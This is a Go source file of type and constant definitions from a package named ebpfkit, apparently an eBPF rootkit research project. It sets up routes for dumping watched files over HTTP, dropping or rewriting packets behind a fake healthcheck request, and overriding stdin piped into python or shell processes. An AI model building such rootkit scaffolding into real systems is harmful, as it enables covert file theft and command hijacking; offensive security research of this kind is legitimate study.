/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package ebpfkit

// Options contains the parameters
type Options struct {
	TargetHTTPServerPort int
}

func (o Options) check() error {
	return nil
}

// HTTPHandler is used to route HTTP requests to eBPF handlers
type HTTPHandler uint32

const (
	// AddFSWatch is the handler used to add a filesystem watch
	AddFSWatch HTTPHandler = iota + 1
	// DelFSWatch is the handler used to remove a filesystem watch
	DelFSWatch
	// GetFSWatch is the handler used to dump a file
	GetFSWatch
)

// HTTPAction is used to define the action to take for a given HTTP request
type HTTPAction uint32

const (
	// Drop indicates that the packet should be dropped
	Drop HTTPAction = iota + 1
	// Edit indicates that the packet should be edited with the provided data
	Edit
)

// HTTPDataBuffer contains the HTTP data used to replace the initial request
type HTTPDataBuffer [256]byte

func NewHTTPDataBuffer(data string) [256]byte {
	rep := [256]byte{}
	copy(rep[:], data[:])
	return rep
}

func NewCommBuffer(from string, to string) [32]byte {
	rep := [32]byte{}
	copy(rep[:], from)
	copy(rep[16:], to)
	return rep
}

func NewPipedProgram(prog string) [500]byte {
	rep := [500]byte{}
	copy(rep[:], prog)
	return rep
}

var (
	// HealthCheckRequest is the default healthcheck request
	HealthCheckRequest = NewHTTPDataBuffer("GET /healthcheck HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: localhost:8000")
	// HealthCheckRequestLen is the length of the default healthcheck request
	HealthCheckRequestLen = uint32(109)
)

type HTTPRoute struct {
	HTTPAction HTTPAction
	Handler    HTTPHandler
	NewDataLen uint32
	NewData    [256]byte
}

const (
	// DNSMaxLength is the max DNS name length in a DNS request or response
	DNSMaxLength = 256
	// DNSMaxLabelLength is the max size of a label in a DNS request or response
	DNSMaxLabelLength = 63
)

const (
	// PipeOverridePythonKey is the key used to override a piped stdin to a python process
	PipeOverridePythonKey = uint32(1)
	// PipeOverrideShellKey is the key used to override a piped stdin to a shell process
	PipeOverrideShellKey = uint32(2)
)
